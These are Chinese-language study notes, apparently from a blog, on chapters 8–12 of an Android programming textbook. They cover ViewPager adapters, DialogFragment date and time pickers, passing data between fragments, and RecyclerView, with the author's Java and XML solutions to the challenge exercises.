FragmentPagerAdapter只是销毁了而fragment的视图，而fragment实例还保留在FragmentManager中。因此FragmentPagerAdapter创建的fragment永远不会被销毁 选择哪种adapter取决于应用的要求。通常来说，使用FragmentStatePagerAdapter更节省内存。 另一方面，如果用户界面只需要少量固定的fragment，则FragmentPagerAdapter是安全、合适的选择。最常见的例子为使用tab选项页显示用户界面。例如，某些应用的明细视图所含内容较多，通常需分两页显示。这时就可以将这些明细信息分拆开来，以多页面的形式展现。显然，为用户界面添加支持滑动切换的ViewPager，能增强应用的触摸体验。此外，将fragment保存在内存中，更易于管理控制器层的代码。对于这种类型的用户界面，每个activity通常只有两三个fragment，基本不用担心有内存不足的风险 深入学习：以代码的方式创建视图以代码的方式创建视图很简单：调用视图类的构造方法，并传入Context参数。不创建任何布局文件，用代码就能创建完整的视图层级结构 但最好不要这样做 使用布局文件的好处： 布局文件能很好地分离控制器层和视图层对象：视图定义在XML布局文件中，控制器层对象定义在Java代码中。这样，假设控制器层有代码修改的话，代码变更管理相对容易很多；反之亦然 使用布局文件，我们还能使用Android的资源适配系统，实现按设备属性自动调用合适的布局文件 当然，布局文件也不是毫无缺点。如果应用只需一个视图，估计没人愿意麻烦地创建并实例化布局XML文件 挑战练习：恢复 CrimeFragment 的边距可能你已经注意到了， CrimeFragment的边距没有了。奇怪啊，在fragment_crime.xml文件里，明明已指定过16dp的边距： 12345&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" android:layout_margin="16dp" android:orientation="vertical"&gt; 发生了什么？原来， ViewPager的布局参数是不支持边距设置的。请修改fragment_crime.xml布局文件，让边距能够显示出来。 将android:layout_margin=&quot;16dp&quot;修改为android:padding=&quot;16dp&quot; 挑战练习：添加 Jump to First 按钮和 Jump to Last 按钮给CrimePagerActivity添加两个按钮。允许使用它们快速跳至第一条和最后一条crime记录。当然，要注意控制，查看第一条记录时应禁用Jump to First按钮，查看最后一条时禁用Jump to Last按钮 修改activity_crime_pager.xml添加两个Button并分别设置id为btn_first和btn_last： 12345678910111213141516171819202122232425262728293031323334353637&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;android.support.constraint.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="match_parent"&gt; &lt;android.support.v4.view.ViewPager android:id="@+id/activity_crime_pager_view_pager" android:layout_width="match_parent" android:layout_height="wrap_content" app:layout_constraintEnd_toEndOf="parent" app:layout_constraintStart_toStartOf="parent" app:layout_constraintTop_toTopOf="parent"&gt; &lt;/android.support.v4.view.ViewPager&gt; &lt;Button android:id="@+id/btn_first" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginStart="16dp" android:layout_marginBottom="32dp" android:text="Jump to First" app:layout_constraintBottom_toBottomOf="parent" app:layout_constraintStart_toStartOf="@+id/activity_crime_pager_view_pager" /&gt; &lt;Button android:id="@+id/btn_last" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginEnd="16dp" android:layout_marginBottom="32dp" android:text="Jump to Last" app:layout_constraintBottom_toBottomOf="parent" app:layout_constraintEnd_toEndOf="@+id/activity_crime_pager_view_pager" /&gt;&lt;/android.support.constraint.ConstraintLayout&gt; 修改CrimePagerActivity绑定两个按钮并设置点击事件： 12345678910111213141516171819202122232425public class CrimePagerActivity extends AppCompatActivity implements View.OnClickListener &#123; ··· private Button mFirstButton; private Button mLastButton; @Override protected void onCreate(@Nullable Bundle savedInstanceState) &#123; ··· mFirstButton = findViewById(R.id.btn_first); mFirstButton.setOnClickListener(this); mLastButton = findViewById(R.id.btn_last); mLastButton.setOnClickListener(this); &#125; ··· @Override public void onClick(View v) &#123; switch (v.getId()) &#123; case R.id.btn_first: mViewPager.setCurrentItem(0); break; case R.id.btn_last: mViewPager.setCurrentItem(mCrimes.size() - 1); break; &#125; &#125;&#125; 给mViewPager添加页面监听： 12345678910111213141516171819202122mViewPager.addOnPageChangeListener(new ViewPager.OnPageChangeListener() &#123; @Override public void onPageScrolled(int i, float v, int i1) &#123; &#125; @Override public void onPageSelected(int i) &#123; mLastButton.setVisibility(View.VISIBLE); mFirstButton.setVisibility(View.VISIBLE); if (i == 0) &#123; mFirstButton.setVisibility(View.GONE); &#125; else if (i == mCrimes.size() - 1) &#123; mLastButton.setVisibility(View.GONE); &#125; &#125; @Override public void onPageScrollStateChanged(int i) &#123; &#125;&#125;); 运行效果 滑至第一项 滑至中间项 滑至最后项 第十二章 对 话 框创建 DialogFragment使用FragmentManager管理对话框，可以更灵活地显示对话框 如果旋转设备，单独使用的AlertDialog会消失，而封装在fragment中的AlertDialog则不会有此问题（旋转后，对话框会被重建恢复） 要显示对话框，首先应完成以下任务： 创建DatePickerFragment类； 创建AlertDialog； 借助FragmentManager在屏幕上显示对话框 创建DatePickerFragment新类，并设置其DialogFragment超类为支持库中的android.support.v4.app.DialogFragment类。 DialogFragment类有如下方法： public Dialog onCreateDialog(Bundle savedInstanceState) 为了在屏幕上显示DialogFragment，托管activity的FragmentManager会调用它 123456789public class DatePickerFragment extends DialogFragment &#123; @Override public Dialog onCreateDialog(Bundle savedInstanceState) &#123; return new AlertDialog.Builder(getActivity()) .setTitle(R.string.date_picker_title) .setPositiveButton(android.R.string.ok, null) .create(); &#125;&#125; 调用setPositiveButton(…)方法，需传入两个参数：字符串资源和实现DialogInterface.OnClickListener接口的对象。（Android有3种可用于对话框的按钮： positive按钮、 negative按钮以及neutral按钮。用户点击positive按钮接受对话框展现信息。如果同一对话框上放置有多个按钮，按钮的类型与命名决定着它们在对话框上显示的位置。）。最后，调用AlertDialog.Builder.create()方法，返回配置完成的AlertDialog实例，完成对话框的创建 显示 DialogFragment要将DialogFragment添加给FragmentManager管理并放置到屏幕上，可调用fragment实例的以下方法： public void show(FragmentManager manager, String tag)public void show(FragmentTransaction transaction, String tag) String参数可唯一识别FragmentManager队列中的DialogFragment。两个方法都可以：如果传入FragmentTransaction参数，你自己负责创建并提交事务；如果传入FragmentManager参数，系统会自动创建并提交事务 在CrimeFragment中，为DatePickerFragment添加一个tag常量。为mDateButton按钮添加OnClickListener监听器接口，实现点击日期按钮展现DatePickerFragment界面： 1234567891011121314151617181920212223public class CrimeFragment extends Fragment &#123;private static final String ARG_CRIME_ID = "crime_id";private static final String DIALOG_DATE = "DialogDate"; ... @Override public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) &#123; ... mDateButton = (Button) v.findViewById(R.id.crime_date); mDateButton.setText(mCrime.getDate().toString()); mDateButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; FragmentManager manager = getFragmentManager(); DatePickerFragment dialog = new DatePickerFragment(); dialog.show(manager, DIALOG_DATE); &#125; &#125;); mSolvedCheckBox = (CheckBox) v.findViewById(R.id.crime_solved); ... return v; &#125;&#125; 设置对话框的显示内容使用AlertDialog.Builder的setView(...)方法，给AlertDialog对话框添加DatePicker组件: public AlertDialog.Builder setView(View view) 该方法配置对话框，实现在标题栏与按钮之间显示传入的View对象 在项目工具窗口中，以DatePicker为根元素，创建名为dialog_date.xml的布局文件。新布局仅包含一个View对象，即我们生成并传给setView(…)方法的DatePicker视图 在DatePickerFragment.onCreateDialog(Bundle)方法中，实例化DatePicker视图并添加给对话框: 12345678910@Overridepublic Dialog onCreateDialog(Bundle savedInstanceState) &#123; View v = LayoutInflater.from(getActivity()) .inflate(R.layout.dialog_date, null); return new AlertDialog.Builder(getActivity()) .setView(v) .setTitle(R.string.date_picker_title) .setPositiveButton(android.R.string.ok, null) .create();&#125; 运行程序，会显示如下界面。如果使用旧版本系统 ，DatePicker组件会使用calendarViewShown属性，显示图12-7： 至此，显示对话框的工作就完成了。下一节，我们实现显示Crime日期，并支持用户对其进行修改 fragment 间的数据传递前面，我们实现了activity之间以及基于fragment的activity之间的数据传递。现在需实现同一activity托管的两个fragment之间的数据传递 要传递crime的日期给DatePickerFragment，需新建一个newInstance(Date)方法，然后将Date作为argument附加给fragment。为返回新日期给CrimeFragment，并更新模型层以及对应视图，需将日期打包为extra并附加到Intent上，然后调用CrimeFragment.onActivityResult(…)方法，并传入准备好的Intent参数 传递数据给 DatePickerFragment要传递crime日期给DatePickerFragment，需将它保存在DatePickerFragment的argument bundle中。这样， DatePickerFragment就能直接获取它。 创建和设置fragment argument通常是在newInstance()方法中完成的（代替fragment构造方法）： 123456789101112public class DatePickerFragment extends DialogFragment &#123; private static final String ARG_DATE = "date"; private DatePicker mDatePicker; public static DatePickerFragment newInstance(Date date) &#123; Bundle args = new Bundle(); args.putSerializable(ARG_DATE, date); DatePickerFragment fragment = new DatePickerFragment(); fragment.setArguments(args); return fragment; &#125; ...&#125; 然 后 ， 在 CrimeFragment 中 ， 用 DatePickerFragment.newInstance(Date) 方 法 替 换DatePickerFragment的构造方法： 12345678910mDateButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; FragmentManager manager = getFragmentManager() DatePickerFragment dialog = new DatePickerFragment(); DatePickerFragment dialog = DatePickerFragment .newInstance(mCrime.getDate()); dialog.show(manager, DIALOG_DATE); &#125;&#125;); DatePickerFragment使用Date中的信息来初始化DatePicker对象。然而， DatePicker对象的初始化需整数形式的月、日、年。 Date是时间戳，无法直接提供整数 要达到目的，必须首先创建一个Calendar对象，然后用Date对象配置它，再从Calendar对象中取回所需信息 在onCreateDialog(Bundle)方法内，从argument中获取Date对象，然后用它和Calendar对象初始化DatePicker： 123456789101112131415161718@Overridepublic Dialog onCreateDialog(Bundle savedInstanceState) &#123; Date date = (Date) getArguments().getSerializable(ARG_DATE); Calendar calendar = Calendar.getInstance(); calendar.setTime(date); int year = calendar.get(Calendar.YEAR); int month = calendar.get(Calendar.MONTH); int day = calendar.get(Calendar.DAY_OF_MONTH); View v = LayoutInflater.from(getActivity()) .inflate(R.layout.dialog_date, null); mDatePicker = (DatePicker) v.findViewById(R.id.dialog_date_picker); mDatePicker.init(year, month, day, null); return new AlertDialog.Builder(getActivity()) .setView(v) .setTitle(R.string.date_picker_title) .setPositiveButton(android.R.string.ok, null) .create();&#125; 返回数据给 CrimeFragment要让CrimeFragment接收DatePickerFragment返回的日期数据，首先需要清楚它们之间的关系。如果是activity的数据回传，我们调用startActivityForResult(…)方法， ActivityManager负责跟踪管理activity父子关系。回传数据后，子activity被销毁，但ActivityManager知道接收数据的是哪个activity。 设置目标fragment 类似于activity间的关联，可将CrimeFragment设置成DatePickerFragment的目标fragment。这样，在CrimeFragment和DatePickerFragment被销毁并重建后，操作系统会重新关联它们。调用以下Fragment方法可建立这种关联： public void setTargetFragment(Fragment fragment, int requestCode) 该方法有两个参数：目标fragment以及类似于传入startActivityForResult(…)方法的请求代码 目标fragment和请求代码由FragmentManager负责跟踪管理，我们可调用fragment（设置目标fragment的fragment）的getTargetFragment()方法和getTargetRequestCode()方法获取它们 在CrimeFragment.java中，创建请求代码常量，然后将CrimeFragment设为DatePickerFragment实例的目标fragment: 1234567891011121314151617181920212223public class CrimeFragment extends Fragment &#123; private static final String ARG_CRIME_ID = "crime_id"; private static final String DIALOG_DATE = "DialogDate"; private static final int REQUEST_DATE = 0; ... @Override public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) &#123; ... mDateButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; FragmentManager manager = getFragmentManager(); DatePickerFragment dialog = DatePickerFragment .newInstance(mCrime.getDate()); dialog.setTargetFragment(CrimeFragment.this, REQUEST_DATE); dialog.show(manager, DIALOG_DATE); &#125; &#125;); ... return v; &#125;&#125; 传递数据给目标fragment 建立CrimeFragment与DatePickerFragment之间的联系后，需将数据回传给CrimeFragment。回传日期将作为extra附加给Intent 使 用 什 么 方 法 发 送 intent 信 息 给 目 标 fragment ？ 虽 然 令 人 难 以 置 信 ， 但 是 我 们 会 让DatePickerFragment类调用CrimeFragment.onActivityResult(int, int, Intent)方法 Activity.onActivityResult(...)方法是ActivityManager在子activity被销毁后调用的父activity方法。处理activity间的数据返回时， ActivityManager会自动调用Activity.onActivityResult(...)方法。父activity接收到Activity.onActivityResult(...)方法调用命令后，其FragmentManager会调用对应fragment的Fragment.onActivityResult(...)方法 处理由同一activity托管的两个fragment间的数据返回时，可借用Fragment.onActivityResult(…)方法。因此，直接调用目标fragment的Fragment.onActivityResult(...)方法，就能实现数据的回传 在DatePickerFragment类中，新建sendResult(...)私有方法，创建intent并将日期数据作为extra附加到intent上。最后调用CrimeFragment.onActivityResult(...)方法: 1234567891011121314151617public class DatePickerFragment extends DialogFragment &#123; public static final String EXTRA_DATE = "com.bignerdranch.android.criminalintent.date"; private static final String ARG_DATE = "date"; ... @Override public Dialog onCreateDialog(Bundle savedInstanceState) &#123; ... &#125; private void sendResult(int resultCode, Date date) &#123; if (getTargetFragment() == null) &#123; return; &#125; Intent intent = new Intent(); intent.putExtra(EXTRA_DATE, date); getTargetFragment().onActivityResult(getTargetRequestCode(), resultCode, intent); &#125;&#125; 现在来使用sendResult(…)私有方法。用户点击对话框中的positive按钮时，需要从DatePicker中获取日期并回传给CrimeFragment。在onCreateDialog(…)方法中，替换掉setPositiveButton(…)的null参数值，实现DialogInterface.OnClickListener监听器接口。在监听器接口的onClick(…)方法中，获取日期并调用sendResult(…)方法: 1234567891011121314151617181920@Overridepublic Dialog onCreateDialog(Bundle savedInstanceState) &#123; ... return new AlertDialog.Builder(getActivity()) .setView(v) .setTitle(R.string.date_picker_title) .setPositiveButton(android.R.string.ok, null); .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int which) &#123; int year = mDatePicker.getYear(); int month = mDatePicker.getMonth(); int day = mDatePicker.getDayOfMonth(); Date date = new GregorianCalendar(year, month, day).getTime(); sendResult(Activity.RESULT_OK, date); &#125; &#125;) .create();&#125; 在CrimeFragment中，覆盖onActivityResult(…)方法，从extra中获取日期数据，设置对应Crime的记录日期，然后刷新日期按钮的显示: 12345678910111213141516171819public class CrimeFragment extends Fragment &#123; ... @Override public View onCreateView(LayoutInflater inflater, ViewGroup container,Bundle savedInstanceState) &#123; ... &#125; @Override public void onActivityResult(int requestCode, int resultCode, Intent data) &#123; if (resultCode != Activity.RESULT_OK) &#123; return; &#125; if (requestCode == REQUEST_DATE) &#123; Date date = (Date) data .getSerializableExtra(DatePickerFragment.EXTRA_DATE); mCrime.setDate(date); mDateButton.setText(mCrime.getDate().toString()); &#125; &#125;&#125; 在onCreateView(…)和onActivityResult(…)这两个方法中，设置按钮显示文字的代码完全一样。为了避免代码冗余，可以将其封装到updateDate()私有方法中，然后分别调用。除 手 动 封 装 代 码 的 方 式 外 ， 还 可 以 使 用 Android Studio 的 内 置 工 具 。 高 亮 选 取 设 置mDateButton显示文字的代码 →右键单击并选择Refactor → Extract → Method…菜单项，设置方法为私有并将其命名为updateDate。点击OK按钮， Android Studio会提示还有其他地方使用了这段代码。点击Yes允许它自动处理。然后确认updateDate方法封装完成并在相应地方调用 日期数据的双向传递完成了。 更为灵活的DialogFragment视图展现 编写需要用户大量输入以及要求更多空间显示输入的应用，并且要让应用同时支持手机和平板设备时，使用onActivityResult(...)方法返回数据给目标fragment是比较方便的 编写同样的代码用于全屏fragment或对话框fragment时，可选择覆盖DialogFragment.onCreateView(...)方法，而非onCreateDialog(...)方法，以实现不同设备上的信息呈现 挑战练习：更多对话框首先看一个简单的练习。另写一个名为TimePickerFragment的对话框fragment，允许用户使用TimePicker组件选择crime发生的具体时间。在CrimeFragment用户界面上再添加一个按钮，以显示TimePickerFragment视图界面 新建TimePickerFragment: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465public class TimePickerFragment extends DialogFragment &#123; private static final String ARG_TIME = "time"; public static final String EXTRA_TIME = "com.suqir.android.criminalintent.time"; private TimePicker mTimePicker; @NonNull @Override public Dialog onCreateDialog(@Nullable Bundle savedInstanceState) &#123; View view = LayoutInflater.from(getActivity()).inflate(R.layout.dialog_time, null); mTimePicker = view.findViewById(R.id.dialog_time_picker); Date date = (Date) getArguments().getSerializable(ARG_TIME); Calendar calendar = Calendar.getInstance(); calendar.setTime(date); final int year = calendar.get(Calendar.YEAR); final int month = calendar.get(Calendar.MONTH); final int day = calendar.get(Calendar.DAY_OF_MONTH); int hour = calendar.get(Calendar.HOUR); int minute = calendar.get(Calendar.MINUTE); if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) &#123; mTimePicker.setHour(hour); mTimePicker.setMinute(minute); &#125; else &#123; mTimePicker.setCurrentHour(hour); mTimePicker.setCurrentMinute(minute); &#125; return new AlertDialog.Builder(getActivity()) .setTitle(R.string.time_picker_title) .setView(mTimePicker) .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() &#123; @Override public void onClick(DialogInterface dialog, int which) &#123; int hour, minute; if (android.os.Build.VERSION.SDK_INT &gt;= android.os.Build.VERSION_CODES.M) &#123; hour = mTimePicker.getHour(); minute = mTimePicker.getMinute(); &#125; else &#123; hour = mTimePicker.getCurrentHour(); minute = mTimePicker.getCurrentMinute(); &#125; Date time = new GregorianCalendar(year, month, day, hour, minute).getTime(); sendResult(Activity.RESULT_OK, time); &#125; &#125;) .create(); &#125; public static TimePickerFragment newInstance(Date time) &#123; Bundle args = new Bundle(); args.putSerializable(ARG_TIME, time); TimePickerFragment fragment = new TimePickerFragment(); fragment.setArguments(args); return fragment; &#125; private void sendResult(int resultCode, Date time)&#123; if (getTargetFragment() == null)&#123; return; &#125; Intent intent = new Intent(); intent.putExtra(EXTRA_TIME, time); getTargetFragment().onActivityResult(getTargetRequestCode(), resultCode, intent); &#125;&#125; 新建视图文件dialog_time.xml: 12345&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;TimePicker xmlns:android="http://schemas.android.com/apk/res/android" android:layout_width="match_parent" android:layout_height="match_parent" android:id="@+id/dialog_time_picker"/&gt; 新建字符串资源： 1&lt;string name="time_picker_title" translatable="true"&gt;Time Of Crime&lt;/string&gt; 修改fragment_crime.xml增加一个Button: 1234&lt;Button android:id="@+id/crime_time" android:layout_width="match_parent" android:layout_height="wrap_content"/&gt; 修改CrimeFragment: 1234567891011121314151617181920212223242526272829303132333435363738public class CrimeFragment extends Fragment &#123; ··· public static final String DIALOG_TIME = "DialogTime"; public static final int REQUEST_TIME = 1; private Button mTimeButton; ··· @Nullable @Override public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) &#123; ··· mTimeButton = v.findViewById(R.id.crime_time); mTimeButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; FragmentManager manager = getFragmentManager(); TimePickerFragment dialog = TimePickerFragment.newInstance(mCrime.getDate()); dialog.setTargetFragment(CrimeFragment.this, REQUEST_TIME); dialog.show(manager, DIALOG_TIME); &#125; &#125;); updateTime(); ··· &#125; ··· @Override public void onActivityResult(int requestCode, int resultCode, Intent data) &#123; ··· if (requestCode == REQUEST_TIME) &#123; Date date = (Date) data.getSerializableExtra(TimePickerFragment.EXTRA_TIME); mCrime.setDate(date); updateTime(); &#125; &#125; ··· private void updateTime() &#123; mTimeButton.setText(DateFormat.format("kk:mm", mCrime.getDate())); &#125;&#125; 运行效果： TimePickerFragment CrimeFragment 挑战练习：实现响应式 DialogFragment再来看一个有些难度的练习：优化DatePickerFragment的呈现方式。 要完成这个挑战，初步分析需三大步。第一步，替换掉onCreateDialog(Bundle)方法，改用onCreateView(…)方法来创建DatePickerFragment的视图。以这种方式创建DialogFragment的话，在对话框界面上看不到标题区域，同样也没有放置按钮的空间。这需要你自行在dialog_date.xml布局中创建OK按钮。 有了DatePickerFragment视图，接下来就能以对话框或以在activity中内嵌的方式展现。第二步，创建SingleFragmentActivity子类。它的任务就是托管DatePickerFragment。 选择这种方式展现DatePickerFragment，就要使用startActivityForResult(…)方法回传日期给CrimeFragment。在DatePickerFragment中，如果目标fragment不存在，就调用托管activity的setResult(int, intent)方法回传日期给CrimeFragment。 最 后 ， 修 改 CriminalIntent 应 用 ： 如 果 是 手 机 设 备 ， 就 以 全 屏 activity 的 方 式 展 现DatePickerFragment；如果是平板设备，就以对话框的方式展现DatePickerFragment。想知道如何按设备屏幕大小优化应用，请提前学习第17章的相关内容 修改dialog_time.xml： 1234567891011121314151617181920212223242526272829303132333435363738&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;android.support.constraint.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="match_parent" android:layout_gravity="center"&gt; &lt;DatePicker android:id="@+id/dialog_date_picker" android:layout_width="wrap_content" android:layout_height="wrap_content" android:layout_marginStart="16dp" android:layout_marginTop="16dp" android:layout_marginEnd="16dp" android:calendarViewShown="false" app:layout_constraintEnd_toEndOf="parent" app:layout_constraintStart_toStartOf="parent" app:layout_constraintTop_toTopOf="parent" /&gt; &lt;Button android:id="@+id/tv_ok" android:layout_width="0dp" android:layout_height="wrap_content" android:layout_marginStart="32dp" android:layout_marginTop="16dp" android:layout_marginEnd="32dp" android:background="@color/design_default_color_primary" android:text="@string/tv_ok" android:textAlignment="center" android:textAppearance="@style/TextAppearance.AppCompat.Body1" android:textColor="@android:color/white" android:textSize="18sp" android:textStyle="bold" app:layout_constraintEnd_toEndOf="parent" app:layout_constraintHorizontal_bias="0.0" app:layout_constraintStart_toStartOf="parent" app:layout_constraintTop_toBottomOf="@+id/dialog_date_picker" /&gt;&lt;/android.support.constraint.ConstraintLayout&gt; 在DatePickerFragment重写onCreateView方法: 12345678910111213141516171819202122232425@Nullable@Overridepublic View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) &#123; View inflate = inflater.inflate(R.layout.dialog_date, container, false); mDatePicker = inflate.findViewById(R.id.dialog_date_picker); mButton = inflate.findViewById(R.id.tv_ok); mButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; int year = mDatePicker.getYear(); int month = mDatePicker.getMonth(); int day = mDatePicker.getDayOfMonth(); Date date = new GregorianCalendar(year, month, day).getTime(); sendResult(Activity.RESULT_OK, date); &#125; &#125;); Date date = (Date) getArguments().getSerializable(ARG_DATE); Calendar calendar = Calendar.getInstance(); calendar.setTime(date); int year = calendar.get(Calendar.YEAR); int month = calendar.get(Calendar.MONTH); int day = calendar.get(Calendar.DAY_OF_MONTH); mDatePicker.init(year, month, day, null); return inflate;&#125; 修改DatePickerFragment中的sendResult方法: 1234567891011private void sendResult(int resultCode, Date date) &#123; Intent intent = new Intent(); intent.putExtra(EXTRA_DATE, date); if (getTargetFragment() == null) &#123; getActivity().setResult(resultCode, intent); getActivity().finish(); return; &#125; intent.putExtra(EXTRA_DATE, date); getTargetFragment().onActivityResult(getTargetRequestCode(), resultCode, intent);&#125; 新建SingleFragmentActivity的子类DialogActivity: 1234567891011121314151617public class DialogActivity extends SingleFragmentActivity &#123; private static final String EXTRA_DATE = "com.suqir.android.criminalintent.date"; private Crime mCrime; @Override protected Fragment createFragment() &#123; UUID crimeId = (UUID) getIntent().getSerializableExtra(EXTRA_DATE); mCrime = CrimeLab.get(this).getCrime(crimeId); return DatePickerFragment.newInstance(mCrime.getDate()); &#125; public static Intent newIntent(Context pakageContext, UUID crimeId) &#123; Intent intent = new Intent(pakageContext, DialogActivity.class); intent.putExtra(EXTRA_DATE, crimeId); return intent; &#125;&#125; 修改CrimeFragment中mDateButton的点击事件： 1234567mDateButton.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; Intent intent = DialogActivity.newIntent(getActivity(), mCrime.getId()); startActivityForResult(intent, REQUEST_DATE); &#125;&#125;); 运行效果： 第三步待学完第17章后再来补充]]></content>
      <categories>
        <category>Android开发</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Android编程权威指南学习笔记二]]></title>
    <url>%2F2020%2F03%2F30%2FAndroid%E7%BC%96%E7%A8%8B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[上一篇笔记记录了学习《Android编程权威指南》的第1-7章，由于内容较多，所以以后将分成多篇文章记录学习内容。这篇文章将记录第8-9章的学习内容 第八章 使用RecyclerView显示列表单例与数据集中存储要创建单例，需创建一个带有私有构造方法及get()方法的类。如果实例已存在， get()方法就直接返回它；如果实例还不存在， get()方法就会调用构造方法创建它。 1234567891011public class CrimeLab &#123; private static CrimeLab sCrimeLab; public static CrimeLab get(Context context) &#123; if (sCrimeLab == null) &#123; sCrimeLab = new CrimeLab(context); &#125; return sCrimeLab; &#125; private CrimeLab(Context context) &#123; &#125;&#125; 首先，注意sCrimeLab变量的s前缀。这是Android开发的命名约定，一看到此前缀，我们就知道sCrimeLab是一个静态变量。 其次，再来看CrimeLab的私有构造方法。显然，其他类无法创建CrimeLab对象，除非调用get()方法。 最后，在get()方法里，我们传入的是Context对象（第14章会用到）。 RecyclerView、 ViewHolder 和 AdapterRecyclerViewRecyclerView是ViewGroup的子类，每一个列表项都是作为一个View子对象显示的。RecyclerView所做的就是回收再利用，循环往复 ViewHolderViewHolder只做一件事：容纳View视图。如图： RecyclerView自 身 不 会 创 建 视 图 ， 它 创 建 的 是 ViewHolder， 而 ViewHolder 引 用 着itemView： AdapterAdapter是一个控制器对象，从模型层获取数据，然后提供给RecyclerView显示，是沟通的桥梁 Adapter负责： ​ ①. 创建必要的ViewHolder； ​ ②. 绑定ViewHolder至模型层数据。 使用RecyclerView RecyclerView类来自于Google支持库。要使用它，首先要添加RecyclerView依赖库。单击File→Project Structure....菜单项切换至项目结构窗口，选择左边的app模块，然后单击Dependencies选项页。单击+按钮弹出依赖库添加窗口。找到并选择recyclerview-v7支持库，单击OK按钮完成依赖库添加。如图： 配置CrimeListFragment的视图文件，根视图使用RecyclerView。 修改CrimeListFragment类文件，使用布局并找到布局中的RecyclerView视图： 12345678@Nullable@Overridepublic View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) &#123; View v = inflater.inflate(R.layout.fragment_crime_list, container, false); mCrimeRecyclerView = v.findViewById(R.id.crime_recycler_view); mCrimeRecyclerView.setLayoutManager(new LinearLayoutManager(getActivity())); return v;&#125; 注意，没有LayoutManager的支持，不仅RecyclerView无法工作，还会导致应用崩溃。所以， RecyclerView视图创建完成后，就立即转交给了LayoutManager对象。 LayoutManager负责在屏幕上摆放列表项和定义屏幕滚动行为。 这里使用的是LinearLayoutManager类，它支持以竖直列表的形式展示列表项；还有GridLayoutManager类，以网格形式展示列表项。 到这里运行应用，看到的是一个RecyclerView空视图。要显示出crime列表项，还需要完成Adapter和ViewHolder的实现 列表项视图新建列表项的布局文件list_item_crime 实现 ViewHolder 和 Adapter到这一步发现了一些书中的问题，书中说到： 但在我使用的Android Studio 3.5中，自动生成的构造方法却是一个参数的： 这是为什么呢？因为Google将实例化 list_item_crime 布局的过程挪到了之后实现 Adapter 的onCreateViewHolder 方法。也就是说，我们需要做的就是将书中原本在 CrimeHolder实例化 list_item_crime 的过程挪到 onCreateViewHolder 方法之中 代码如下： 接下来创建Adapter，需要显示新创建的ViewHolder或让Crime对象和已创建的ViewHolder关联时， RecyclerView会去找Adapter（调用它的方法）。 RecyclerView不关心也不了解具体的Crime对象，这是Adapter要做的事 接下来，在CrimeAdapter中实现三个方法： 123456789101112131415@NonNull@Overridepublic CrimeHolder onCreateViewHolder(@NonNull ViewGroup viewGroup, int i) &#123; View view = LayoutInflater.from(getActivity()).inflate(R.layout.list_item_crime, viewGroup, false); return new CrimeHolder(view);&#125;@Overridepublic void onBindViewHolder(@NonNull CrimeHolder crimeHolder, int i) &#123;&#125;@Overridepublic int getItemCount() &#123; return mCrimes.size();&#125; (注意：onCreateViewHolder方法已经添加了上文的修改内容) RecyclerView需要新的ViewHolder来显示列表项时，会调用onCreateViewHolder方法。在这个方法内部，我们创建一个LayoutInflater，然后用它创建CrimeHolder 搞定了Adapter，最后要做的就是将它和RecyclerView关联起来。实现一个设置CrimeListFragment用户界面的updateUI方法，该方法创建CrimeAdapter，然后设置给RecyclerView 绑定列表项CrimeHolder还需要一个bind(Crime)方法： 1234567private Crime mCrime;···public void bind(Crime crime)&#123; mCrime = crime; mTitleTextView.setText(crime.getTitle()); mDateTextView.setText(crime.getDate().toString());&#125; 每次有新的Crime要在CrimeHolder中显示时，都要调用它一次，并在Adapter中的onbindViewHolder方法中使用它： 12345@Overridepublic void onBindViewHolder(@NonNull CrimeHolder crimeHolder, int i) &#123; Crime crime = mCrimes.get(i); crimeHolder.bind(crime);&#125; 最后运行效果将会显示每个Crime的Title和Date 响应点击我们通过修改CrimeHolder类来处理用户点击事件: 123456789101112131415private class CrimeHolder extends RecyclerView.ViewHolder implements View.OnClickListener &#123; ··· private Crime mCrime; public CrimeHolder(@NonNull View itemView) &#123; super(itemView); ··· itemView.setOnClickListener(this); &#125; @Override public void onClick(View v) &#123; Toast.makeText(getActivity(),mCrime.getTitle() + "Clicked", Toast.LENGTH_SHORT).show(); &#125;&#125; 挑战练习： RecyclerView ViewType请在RecyclerView中创建两类列表项：一般性crime，以及需警方介入的crime。要完成这个挑战，你需要用到RecyclerView.Adapter的视图类别功能（ view type）。在Crime对象里，再添加一个mRequiresPolice实例变量，使用它并借助getItemViewType(int)方法（ https://developer.android.com/reference/android/support/v7/widget/RecyclerView.Adapter.html#getItemViewType(int)），确定该加载哪个视图到`CrimeAdapter`。在onCreateViewHolder(ViewGroup, 